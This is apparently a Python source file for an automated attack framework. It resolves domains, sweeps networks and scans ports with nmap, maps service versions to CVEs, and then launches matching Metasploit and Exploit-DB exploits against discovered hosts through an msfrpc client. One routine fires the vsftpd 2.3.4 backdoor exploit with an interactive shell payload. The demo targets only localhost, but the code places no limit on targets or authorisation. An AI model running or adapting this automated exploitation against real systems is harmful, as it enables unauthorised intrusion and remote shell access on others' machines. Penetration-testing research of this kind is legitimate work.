import time
import networkx
import socket
import ipaddress
import platform
import subprocess
import nmap
from anytree import Node, PreOrderIter
from anytree.exporter import DotExporter
import matplotlib.pyplot as plt
import sys
import os
import json
from my_database import VulnerabilityMapper, Filter
from difflib import SequenceMatcher
from global_data import step, VISUALIZE, msfrpc_password, msf_client




class DataNode:
    full_nodes = []
    exec_tree_root = Node('Start')
    vuln_mapper = VulnerabilityMapper()
    filter = Filter()

    def __init__(self, g):
        self.g = g
        self.functions = []
        # State|Reporting|Search
        self.state = {}
        self.possible_vulnerabilities = []
        self.possible_exploits = []
        self.exploits_to_run = []


    def update_state(self, new_data_as_dict):
        self.state.update(new_data_as_dict)

    def add_to_state(self, key, val):
        try:
            data = self.state[key]
            data += ' ' + val
            self.state.update({key: data})
        except KeyError:
            self.state.update({key: val})

    def get_information_string(self):
        inf_str = ''
        for k, val in self.state.items():
            inf_str += '|{}:{}\n|'.format(k, val)
        return inf_str

    def _vuln_by_cpe(self):
        try:
            cpe = self.cpe
            if not cpe:
                return []
        except AttributeError:
            return []
        return type(self).vuln_mapper.cpe_to_cve(cpe)

    def run_exploits(self, **kargs):
        global msf_client
        print('Running exploits - for {}'.format(self))
        for e in self.exploits_to_run:
            try:
                exploit = msf_client.modules.use('exploit', e)
            except:
                print('Problem with execution of', e)
                continue
            for arg in kargs.keys():
                if arg in exploit.options:
                    exploit[arg] = kargs[arg]
            if exploit.missing_required:
                print('Impossible to execute exploit {} due to lack of the information: {}'.format(
                                                                                e, ','.join(exploit.missing_required)))
                continue
            try:
                payload = exploit.targetpayloads()[0]
                result = exploit.execute(payload=payload)
            except:
                try:
                    result = exploit.execute()
                except:
                    continue
            if result['job_id']:
                print('Exploit {} was successfully executed'.format(e))
                self.add_to_state('Tested exploits', '{} -> success'.format(e))
                cve_name, cve_info = type(self).vuln_mapper.get_cve_by_exploit(e)
                linked_cve = CVE(self.g, cve_name, cve_info)
                self.add_data(linked_cve)
                return
            else:
                print('Exploit {} failed'.format(e))
                self.add_to_state('Tested exploits', '{} -> error'.format(e))


    def find_vulnerabilities(self):
        print('Search for possible vulnerabilities for {}'.format(self))
        result = []
        cpe_vuln_list = self._vuln_by_cpe()

        result += cpe_vuln_list
        self.possible_vulnerabilities = result
        self.update_state({
            'Possible vulnerabilities':
                ','.join(result)
        })

    def find_exploits(self, *searchdata, **search_info):
        print('Search for possible exploits for {}'.format(self))
        for cve in self.possible_vulnerabilities:
            self.exploits_to_run += type(self).vuln_mapper.get_metasploit_exploit_by_cve(cve, **search_info)
            self.possible_exploits += type(self).vuln_mapper.cve_to_exploits(cve)

        exploitdb_exploits = type(self).vuln_mapper.searchsploit_find(*searchdata, **search_info)
        self.exploits_to_run += exploitdb_exploits

        self.possible_exploits = list(set(self.possible_exploits))
        self.exploits_to_run = list(set(self.exploits_to_run))
        type(self).filter(self)

        self.update_state({
            'Exploits by CVE':
                ','.join(self.possible_exploits)})

        self.update_state({
            'Possible exploits, actually executed':
                ','.join(self.exploits_to_run)
        })

    def report(self):
        return

    def _add_object_functions(self, obj, *functions):
        for f in functions:
            self.g.add_edge(obj, f, isfunction=True)

    def add_functions(self, *functions):
        for f in functions:
            self.g.add_edge(self, f, isfunction=True)

    def check_neighbor_links(self, data):
        return data not in [i for i in self.g.neighbors(self)]

    def check_presence_in_graph(self, data):
        return data not in list(self.g.nodes)

    def add_data(self, *data):
        for d in data:
            if self.check_presence_in_graph(d):
                self._add_object_functions(d, *d.functions)
            if self.check_neighbor_links(d):
                print(' + New link to', d, 'found')
                self.g.add_edge(self, d, isfunction=False)


    def run(self):
        # Visualize graph
        global VISUALIZE
        if VISUALIZE:
            global step
            nodes = self.g.nodes
            labels = {}
            for n in nodes:
                try:
                    labels.update({n: n.__name__})
                except AttributeError:
                    labels.update({n: str(n)})
            networkx.draw(self.g, with_labels=True, labels=labels)
            plt.savefig('g{}.png'.format(step))
            plt.clf()
            step += 1

        neighbors = self.g[self].copy()
        for obj, t in neighbors.items():
            if t['isfunction']:
                obj()
                self.g.remove_node(obj)
                if VISUALIZE:
                    # Create execution tree
                    last_function = list(PreOrderIter(type(self).exec_tree_root))[-1]
                    Node(str(step) + ':' + obj.__qualname__, parent=last_function)

        self.end()
        neighbors = self.g[self].copy()
        for obj, t in neighbors.items():
            if not t['isfunction']:
                if obj not in type(self).full_nodes:
                    obj.run()

    def save_execution_tree(self):
        # Save execution tree
        global VISUALIZE
        if VISUALIZE:
            file_name = 'Execution_tree-{}.dot'.format(str(int(time.time())))
            DotExporter(type(self).exec_tree_root).to_dotfile(file_name)
            subprocess.run(['dot', '-T', 'png', file_name, '-O'])

    def end(self):
        edges_list = dict(self.g[self]).items()
        for obj, t in edges_list:
            if t['isfunction']:
                return False
        if self not in type(self).full_nodes:
            type(self).full_nodes.append(self)
        print(' -', self, 'Finished')
        return True


class CVE(DataNode):
    def __init__(self, g, cve_name, cve_info):
        super().__init__(g)
        self.cve_name = cve_name
        self.cve_info = cve_info
        self.update_state(self.cve_info)

    def __str__(self):
        return self.cve_name

    def __hash__(self):
        return hash(self.cve_name)


class Domain(DataNode):
    def __init__(self, g, domain):
        super().__init__(g)
        self.domain = domain
        self.functions = [self.getIP, self.find_vulnerabilities]
        self.update_state({'Domain': self.domain})

    def __str__(self):
        return 'Domain: {}'.format(self.domain)

    def __eq__(self, other):
        if not isinstance(other, type(self)):
            return False
        return self.domain == other.domain

    def __hash__(self):
        return hash(self.domain)

    def _socket_get_ip(self):
        ip_addr = socket.gethostbyname(self.domain)
        ip_addr = ipaddress.ip_address(ip_addr)
        ip = HostIP(self.g, ip_addr)
        self.add_data(ip)

    def getIP(self):
        print('Resolving domain name')
        self._socket_get_ip()


class Service(DataNode):
    def __init__(self, g, port=None, transport=None, state=None, proto_name=None, product=None, version=None,
                 extrainfo=None, script_info=None, cpe=None):
        super().__init__(g)
        self.port = port
        self.port_state = state
        self.transport = transport
        self.proto_name = proto_name
        self.product = product
        self.version = version
        self.extrainfo = extrainfo
        self.script_info = script_info
        self.cpe = cpe
        self.functions = [self.find_vulnerabilities, self.find_exploits, self.run_exploits]
        # Update the state, assumed that service is created with some information discovered
        self.update_state({
            'Protocol': self.proto_name,
            'Version': self.version,
            'Port': self.port,
            'Product': self.product,
            'cpe': self.cpe
        })

    def find_exploits(self, *search_data, **search_info):
        host = self._get_linked_host()
        os = host._get_linked_OS()
        os = os.os_name.lower()

        if os:
            super().find_exploits(self.product, self.version, os=[os])
            super().find_exploits(self.proto_name, self.version, os=[os])
        else:
            super().find_exploits(self.product, self.version)
            super().find_exploits(self.proto_name, self.version, os=[os])

    def __str__(self):
        # Trick for visual representation
        if self._get_linked_host():
            return self.proto_name + ':' + str(self._get_linked_host().ip) + ':' + str(self.port)
        else:
            return self.proto_name + ':' + str(self.port)

    def __eq__(self, other):
        if not isinstance(other, type(self)):
            return False
        return (str(self.port) + self.proto_name + str(self._get_linked_host().ip) + str(self.cpe)) == \
               (str(other.port) + other.proto_name + str(self._get_linked_host().ip) + str(self.cpe))

    def __hash__(self):
        return hash(str(self.port) + self.proto_name + str(self.version) + str(self.product) + str(self.cpe))

    def _get_linked_host(self):
        # Trick for visual representation, logically service should always be linked to host
        try:
            neighbors = list(self.g[self])
        except KeyError:
            return False
        for n in neighbors:
            if type(n) == HostIP:
                return n
        return False

    def run_exploits(self):
        host_ip = str(self._get_linked_host())
        super().run_exploits(RHOSTS=host_ip, RPORT=self.port)

class SSH(Service):
    def __init__(self, g, port=None, transport=None, state=None, proto_name=None, product=None, version=None,
                 extrainfo=None, script_info=None, cpe=None):
        super().__init__(g, port, transport, state, proto_name, product, version, extrainfo, script_info, cpe)


class HTTP(Service):
    def __init__(self, g, port=None, transport=None, state=None, proto_name=None, product=None, version=None,
                 extrainfo=None, script_info=None, cpe=None):
        super().__init__(g, port, transport, state, proto_name, product, version, extrainfo, script_info, cpe)


class FTP(Service):
    def __init__(self, g, port=None, transport=None, state=None, proto_name=None, product=None, version=None,
                 extrainfo=None, script_info=None, cpe=None):
        super().__init__(g, port, transport, state, proto_name, product, version, extrainfo, script_info, cpe)
        self.functions = [self.testForCVE20112523, ] + self.functions

    def testForCVE20112523(self):
        global msf_client
        if self.version != '2.3.4' or self.product != 'vsftpd':
            self.update_state({"CVE-2011-2523": 'no vulnerability   '})
            return
        target_host = self._get_linked_host()
        target_ip = str(target_host.ip)
        print('Testing for CVE2011-2523 for {}'.format(target_ip))
        exploit = msf_client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
        exploit['RHOSTS'] = target_ip
        res = exploit.execute(payload='cmd/unix/interact')
        if res['job_id']:
            cve_state_success ={"CVE-2011-2523":
                                    'tested with metasploit - exploit unix/ftp/vsftpd_234_backdoor - > vulnerable '}
            self.update_state(cve_state_success)
        else:
            cve_sate_fail = {"CVE-2011-2523":
                                 'tested with metasploit - exploit unix/ftp/vsftpd_234_backdoor - > no vulnerability '}
            self.update_state(cve_sate_fail)


class MYSQL(Service):
    def __init__(self, g, port=None, transport=None, state=None, proto_name=None, product=None, version=None,
                 extrainfo=None, script_info=None, cpe=None):
        super().__init__(g, port, transport, state, proto_name, product, version, extrainfo, script_info, cpe)


class Telenet(Service):
    def __init__(self, g, port=None, transport=None, state=None, proto_name=None, product=None, version=None,
                 extrainfo=None, script_info=None, cpe=None):
        super().__init__(g, port, transport, state, proto_name, product, version, extrainfo, script_info, cpe)


class OS(DataNode):
    def __init__(self, g, os_name=None, vendor=None, version=None, cpe=None):
        super().__init__(g)
        self.os_name = os_name
        self.vendor = vendor
        self.version = version
        self.cpe = cpe
        # State update
        self.update_state({
            'OS': self.os_name,
            'Vendor': self.vendor,
            'Version': self.version,
            'cpe': self.cpe
        })

    def __str__(self):
        return 'OS:' + self.cpe

    def __eq__(self, other):
        if not isinstance(other, OS):
            return False
        return (str(other.cpe) + str(other.version)+other.os_name) == (str(self.cpe) + str(self.version) + self.os_name)

    def __hash__(self):
        hstr = 'OS'
        for i in [self.os_name, self.vendor, self.version, self.cpe]:
            if i:
                hstr += i
        return hash(hstr)


class HostIP(DataNode):
    def __init__(self, g, ip, alive=None):
        super().__init__(g)
        self.ip = ip
        self.alive = alive
        self.vendor = None
        if self.alive:
            self.functions = [self.getDomain, self.scanSevices]
        else:
            self.functions = [self.checkIfAlive, self.getDomain, self.scanSevices]
        # Update state
        self.update_state({
            'IP': str(self.ip)
        })

    def __str__(self):
        return 'Host {}'.format(str(self.ip))

    def __eq__(self, other):
        if not isinstance(other, HostIP):
            return False
        return str(self.ip) == str(other.ip)

    def __hash__(self):
        return hash(self.ip)


    def _get_linked_OS(self):
        try:
            neighbors = list(self.g[self])
        except KeyError:
            return False
        for n in neighbors:
            if type(n) == OS:
                return n
        return False


    def _ping(self):
        host = str(self.ip)
        param = '-n' if platform.system().lower() == 'windows' else '-c'
        command = ['ping', param, '1', host]
        return subprocess.call(command) == 0

    def _nmap_alive_check(self):
        nm = nmap.PortScanner()
        nm.scan(hosts=str(self.ip), arguments='-n -sP -PR -PE -PA21,23,80,3389')
        try:
            return True if nm[str(self.ip)].state() == 'up' else False
        except KeyError:
            return False

    def checkIfAlive(self):
        print('Checking if host {} is up'.format(str(self.ip)))
        #p1 = self._ping()
        p2 = self._nmap_alive_check()
        self.alive = p2
        self.add_to_state('Alive', str(self.alive))

    def _socket_get_domain(self):
        try:
            d = socket.gethostbyaddr(str(self.ip))[0]
            d = Domain(self.g, d)
            self.add_data(d)
        except socket.herror:
            pass

    def getDomain(self):
        print('Performing reverse DNS lookup')
        self._socket_get_domain()

    def _nmap_port_scan(self):
        nm = nmap.PortScanner()
        nm.scan(hosts=str(self.ip), arguments='-Pn -A')
        scan_info = nm[str(self.ip)]
        # Fill service information
        for transport_proto in scan_info.all_protocols():
            for port in scan_info[transport_proto].keys():
                name = scan_info[transport_proto][port]['name']
                state = scan_info[transport_proto][port]['state']
                product = scan_info[transport_proto][port]['product']
                version = scan_info[transport_proto][port]['version']
                extrainfo = scan_info[transport_proto][port]['extrainfo']
                cpe = scan_info[transport_proto][port]['cpe']
                cpe_execption_list = ['cpe:/o:linux:linux_kernel']
                if cpe in cpe_execption_list:
                    cpe = ''
                try:
                    script_info = scan_info[transport_proto][port]['script']
                except KeyError:
                    script_info = None
                # ! Each service created independently ?
                match state, name:
                    case 'open', 'ssh':
                        ssh = SSH(self.g, state=state, proto_name=name, transport=transport_proto, product=product,
                                  version=version, extrainfo=extrainfo, script_info=script_info, port=port, cpe=cpe)
                        self.add_data(ssh)
                    case 'open', 'ftp':
                        ftp = FTP(self.g, state=state, proto_name=name, transport=transport_proto, product=product,
                                  version=version, extrainfo=extrainfo, script_info=script_info, port=port, cpe=cpe)
                        self.add_data(ftp)
                    case 'open', 'http':
                        http = HTTP(self.g, state=state, proto_name=name, transport=transport_proto, product=product,
                                    version=version, extrainfo=extrainfo, script_info=script_info, port=port, cpe=cpe)
                        self.add_data(http)
                    case 'open', 'mysql':
                        mysql = MYSQL(self.g, state=state, proto_name=name, transport=transport_proto, product=product,
                                    version=version, extrainfo=extrainfo, script_info=script_info, port=port, cpe=cpe)
                        self.add_data(mysql)
                    case 'open', 'telnet':
                        telnet = Telenet(self.g, state=state, proto_name=name, transport=transport_proto, product=product,
                                    version=version, extrainfo=extrainfo, script_info=script_info, port=port, cpe=cpe)
                        self.add_data(telnet)

                    # If process of vulnerability finding and exploit execution will be fully automated,
                    # There no reason to split services as independent classes
                    case 'open', _:
                        some_service = Service(self.g, state=state, proto_name=name, transport=transport_proto, product=product,
                                    version=version, extrainfo=extrainfo, script_info=script_info, port=port, cpe=cpe)
                        self.add_data(some_service)

            # Fill OS information if available
            try:
                os = nm[str(self.ip)]['osmatch'][0]['osclass'][0]
            except KeyError:
                pass
            name = os['osfamily']
            vendor = os['vendor']
            version = os['osgen']
            cpe = os['cpe'][0]
            os = OS(self.g, name, vendor, version, cpe)
            self.add_data(os)

    def scanSevices(self):
        if self.alive == None:
            self.add_functions(self.scanSevices)
            return

        print('Start services scanning')
        if self.alive == False:
            return
        self._nmap_port_scan()


class IPv4Network(DataNode):
    def __init__(self, g, ip):
        super().__init__(g)
        self.ip = ipaddress.IPv4Network(ip)
        self.uphosts = 0
        self.hosts = []
        self.functions = [self.add_hosts, ]
        # Update state
        self.update_state({
            'IP': str(self.ip),
            'Up-Hosts': self.uphosts
        })

    def _nmap_netwrok_scan(self):
        nm = nmap.PortScanner()
        nm.scan(hosts=str(self.ip), arguments='-n -sP -PR -PE -PA21,23,80,3389')
        self.uphosts = int(nm.scanstats()['uphosts'])
        for host in nm.all_hosts():
            if nm[host].state() == 'up' and host != str(self.ip.network_address):
                discovered_host = HostIP(self.g, host, True)
                self.hosts.append(discovered_host)

    def add_hosts(self):
        self._nmap_netwrok_scan()
        self.add_data(*self.hosts)
        self.update_state({'Up-Hosts': self.uphosts})

    def __str__(self):
        return 'IPv4Net: {}'.format(str(self.ip))


class Test(DataNode):
    def __init__(self, g, target=None, target_from_file=None):
        super().__init__(g)
        self.targets = target if target else []
        self.target_file = target_from_file
        self.init_target()
        self.g.add_node(self, isfunction=False)
        self.functions = []
        self.add_functions(*self.functions)
        self.add_data(*self.targets)

    def __str__(self):
        return 'Root Object'

    def update(self):
        pass

    def init_target(self):
        if self.targets:
            return
        if not self.target_file:
            print('Target not specified')
            exit(0)
        try:
            with open(self.target_file) as f:
                data = json.load(f)
        except FileNotFoundError:
            print('File {} not found'.format(self.target_file))
            exit(0)
        try:
            domain = data['domain']
            domain = Domain(self.g, domain)
            self.targets.append(domain)
        except KeyError:
            pass
        try:
            hosts = data['hosts']
            for h in hosts:
                tmp_h = HostIP(self.g, h)
                self.targets.append(tmp_h)
        except KeyError:
            pass
        try:
            network = data['network']
            self.targets.append(IPv4Network(self.g, network))
        except KeyError:
            pass




if __name__ == '__main__':
    g = networkx.Graph()
    test_target1 = [HostIP(g, '127.0.0.1'), HostIP(g, '127.0.0.2')]
    test_target2 = [IPv4Network(g, '127.0.0.0/24')]
    t = Test(g, target=test_target1)
    t.run()
    t.save_execution_tree()
